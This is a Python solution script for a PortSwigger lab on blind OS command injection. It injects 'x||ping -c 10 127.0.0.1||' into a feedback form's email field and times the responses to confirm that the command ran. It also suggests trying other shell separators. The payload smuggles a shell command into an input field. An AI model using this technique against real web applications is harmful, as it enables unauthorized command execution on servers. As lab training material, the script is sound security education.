# Lab 02 — Blind OS command injection with time delays
# PortSwigger: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
#
# Vulnerability: The feedback submission function executes a shell command
#                containing user-supplied details, but the output is never
#                returned in the response — the only signal is response time
# Aim:           Cause a 10-second delay to confirm blind OS command injection
#
# Technique:
#   Inject a ping command wrapped in ||...|| so it runs regardless of the
#   surrounding command's success/failure and doesn't break the rest of the
#   original shell syntax that follows our injection point.
#
#     email = x||ping -c 10 127.0.0.1||
#
#   If the response takes ~10 seconds LONGER than a normal submission,
#   the injected command executed.
#
# Usage: python os_command_injection_lab02.py <url>

import sys
import urllib3
from proxies import proxies
from os_command_injection_utils import banner, section, make_session, submit_feedback, timed_request, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASELINE_EMAIL = "test@test.com"
INJECTED_EMAIL = "x||ping -c 10 127.0.0.1||"
DELAY_THRESHOLD_SECONDS = 8  # allow some margin below the full 10s requested

if __name__ == "__main__":
    banner()
    section("LAB 02 — BLIND OS COMMAND INJECTION WITH TIME DELAYS")

    if len(sys.argv) != 2:
        print("  Usage: python os_command_injection_lab02.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: baseline timing ───────────────────────────────────────────────
    print("  ── Step 1: measure baseline response time\n")
    r_baseline, t_baseline = timed_request(submit_feedback, session, url, BASELINE_EMAIL)
    print(f"  ℹ  Baseline response time: {t_baseline:.2f}s\n")

    # ── Step 2: injected payload timing ───────────────────────────────────────
    print("  ── Step 2: submit feedback with the time-delay payload\n")
    print(f"  ➜  Payload (email field): {INJECTED_EMAIL}\n")

    r_injected, t_injected = timed_request(submit_feedback, session, url, INJECTED_EMAIL)
    print(f"  ℹ  Injected response time: {t_injected:.2f}s\n")

    # ── Step 3: compare ────────────────────────────────────────────────────────
    delta = t_injected - t_baseline
    print(f"  ℹ  Time difference: {delta:.2f}s\n")

    if delta >= DELAY_THRESHOLD_SECONDS:
        print(f"  ✔  Confirmed: response took {delta:.2f}s longer than baseline")
        print(f"     ({DELAY_THRESHOLD_SECONDS}s+ threshold) — blind OS command")
        print(f"     injection confirmed via time delay.")
    else:
        print(f"  ✘  Delay not observed (expected {DELAY_THRESHOLD_SECONDS}s+,")
        print(f"     got {delta:.2f}s). Try a different shell separator —")
        print(f"     some apps use ;, &, or && instead of ||.")

    print()
    print("  ℹ  The ||...|| wrapping pattern ensures the injected command")
    print("     always runs (regardless of what came before) and that anything")
    print("     the application appends AFTER our input doesn't break the")
    print("     overall shell syntax and cause an unpredictable error instead.")
